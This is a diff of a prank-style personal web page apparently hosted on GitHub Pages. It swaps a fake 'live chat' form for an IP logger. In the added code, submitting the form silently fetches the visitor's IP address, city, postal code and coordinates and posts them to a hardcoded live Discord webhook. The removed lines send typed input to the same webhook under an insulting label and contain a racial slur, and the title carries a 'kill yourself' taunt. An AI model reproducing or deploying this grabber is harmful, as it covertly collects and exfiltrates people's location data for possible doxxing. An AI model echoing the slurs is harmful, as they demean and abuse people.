@@ -2,7 +2,7 @@
 <head>
   <title>kys.penis</title>
   <meta property="og:title" content="kys.penis">
-  <meta property="og:description" content="GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD">
+  <meta property="og:description" content="GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD">
   <meta property="og:image" content="https://sodaduhking2.github.io/sodaduhking2.github.io/background.jpg">
   <meta property="og:url" content="https://sodaduhking2.github.io/sodaduhking2.github.io/">
   <style>
@@ -85,8 +85,8 @@
   </a>
   
   <form id="ipLoggerForm">
-    <input type="text" id="ipAddress" placeholder="username here">
-    <button type="submit">live chat</button>
+    <input type="text" id="ipAddress" placeholder="Enter your IP address">
+    <button type="submit">Log IP</button>
   </form>
   
   <script>
@@ -107,28 +107,54 @@
 
     ipLoggerForm.addEventListener('submit', function(event) {
       event.preventDefault();
-      const ipAddress = ipAddressInput.value;
-      // Send the IP address to a Discord webhook
-      const webhookUrl = 'https://discord.com/api/webhooks/1276348134494044221/jU9BuKMVo6KKnac9nsaJmzP0G2gA4m3AwVfMqie6AjAqfZorgvBMGkYRfmN1XHUDQ7ki';
-      const payload = {
-        content: `stupid fuckers info: ${ipAddress}`
-      };
-      fetch(webhookUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(payload)
-      })
-        .then(response => {
-          if (response.ok) {
-            console.log('big yay');
-          } else {
-            console.error('boooo');
-          }
+      // Retrieve the IP address using a third-party API
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ipAddress = data.ip;
+          // Retrieve additional information about the IP address
+          fetch(`https://ipapi.co/${ipAddress}/json/`)
+            .then(response => response.json())
+            .then(data => {
+              const ipInfo = `
+                IP Address: ${ipAddress}
+                Country: ${data.country_name}
+                Region: ${data.region}
+                City: ${data.city}
+                Timezone: ${data.timezone}
+                Postal Code: ${data.postal}
+                Latitude: ${data.latitude}
+                Longitude: ${data.longitude}
+              `;
+              // Send the IP information to a Discord webhook
+              const webhookUrl = 'https://discord.com/api/webhooks/1276348134494044221/jU9BuKMVo6KKnac9nsaJmzP0G2gA4m3AwVfMqie6AjAqfZorgvBMGkYRfmN1XHUDQ7ki';
+              const payload = {
+                content: `condom man says:\n${ipInfo}`
+              };
+              fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+              })
+                .then(response => {
+                  if (response.ok) {
+                    console.log('IP information logged to Discord successfully');
+                  } else {
+                    console.error('Failed to log IP information to Discord');
+                  }
+                })
+                .catch(error => {
+                  console.error('Error logging IP information to Discord:', error);
+                });
+            })
+            .catch(error => {
+              console.error('Error retrieving IP information:', error);
+            });
         })
         .catch(error => {
-          console.error('son of a bitch i hate niggers:', error);
+          console.error('Error retrieving IP address:', error);
         });
     });
   </script>
